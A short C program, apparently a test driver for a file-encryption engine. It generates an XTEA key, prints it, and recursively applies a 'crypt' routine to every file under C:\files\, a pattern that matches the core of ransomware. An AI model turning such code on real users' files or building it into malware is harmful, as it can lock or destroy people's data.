#include <stdio.h>
#include "engine.h"
#include "traverse.h"
#include "crypt.h"
#include "xtea.h"

void proc(char *filepath)
{
	printf("%s\n", filepath);
}

int main(int argc, char *argv[])
{
	XTEA_DATA xtea;
	char init_dir[MAX_PATH] = "C:\\files\\";
	char file_mask[] = "*.*";
	int i;

	xtea_init(&xtea, XTEA_STD_KEYSIZE, XTEA_GENERATE_LETTERS);

	printf("key = %s\n", xtea.xtea_key);
	printf("hash = 0x%x\n", xtea.XTEA_KEY_HASH);
	traverse_folders(init_dir, file_mask, crypt, &xtea);
}